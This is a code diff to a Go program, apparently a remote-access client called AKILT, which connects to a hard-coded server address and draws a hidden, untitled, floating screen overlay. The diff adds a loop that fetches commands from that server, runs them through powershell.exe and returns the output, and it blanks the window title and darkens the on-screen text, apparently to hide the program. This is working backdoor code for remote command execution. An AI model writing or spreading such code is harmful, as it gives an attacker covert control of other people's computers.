@@ -15,6 +15,7 @@ import (
 	_ "embed"
 	"fmt"
 	"log"
+	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
@@ -22,10 +23,10 @@ import (
 	"unicode/utf8"
 	"unsafe"
 
-	"github.com/Xart3mis/GoHkar/lib/bundles"
-	"github.com/Xart3mis/GoHkar/lib/consumer"
-	"github.com/Xart3mis/GoHkar/lib/reg"
-	pb "github.com/Xart3mis/GoHkarComms/client_data_pb"
+	"github.com/Xart3mis/AKILT/Client/lib/bundles"
+	"github.com/Xart3mis/AKILT/Client/lib/consumer"
+	"github.com/Xart3mis/AKILT/Client/lib/reg"
+	"github.com/Xart3mis/AKILTC/pb"
 	"github.com/go-gl/gl/all-core/gl"
 	"github.com/go-gl/glfw/v3.3/glfw"
 	"github.com/nullboundary/glfont"
@@ -53,7 +54,7 @@ func init() {
 }
 
 func main() {
-	c, err := consumer.Init("172.21.108.49:8000")
+	c, err := consumer.Init("172.21.105.205:8000")
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -91,7 +92,7 @@ func main() {
 	glfw.WindowHint(glfw.Floating, glfw.True)
 	glfw.WindowHint(glfw.Visible, glfw.False)
 
-	window, err := glfw.CreateWindow(mode.Width, mode.Height, "Testing", nil, nil)
+	window, err := glfw.CreateWindow(mode.Width, mode.Height, "", nil, nil)
 	if err != nil {
 		panic(err)
 	}
@@ -148,6 +149,20 @@ func main() {
 			log.Println(err)
 		}
 		Draw(font, mode, pid, text, window, should_update)
+
+		d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
+		if err != nil {
+			log.Println("Error during GetCommand:", err)
+		}
+
+		var out []byte
+		if d.GetShouldExec() {
+			out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
+			c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+			if err != nil {
+				log.Println("Error during exec", err)
+			}
+		}
 	}
 	cancel()
 	receiver.CloseSend()
@@ -200,9 +215,9 @@ func Draw(font *glfont.Font, mode *glfw.VidMode, pid string, text string, window
 	gl.ClearColor(0, 0, 0, 0)
 
 	if update {
-		font.SetColor(1.0, 1.0, 1.0, 1.0)
+		font.SetColor(0, 0, 0, 1.0)
 		for idx, line := range strings.Split(WordWrap(text, 40), "\n") {
-			font.Printf(float32(mode.Width)/2-font.Width(1.0, line)/2, float32(mode.Height)/3+float32(idx*50), 1.0, line)
+			font.Printf(float32(mode.Width)/2-font.Width(1.0, line)/2, float32(mode.Height)/3+float32(idx*55), 1.0, line)
 		}
 	}
 
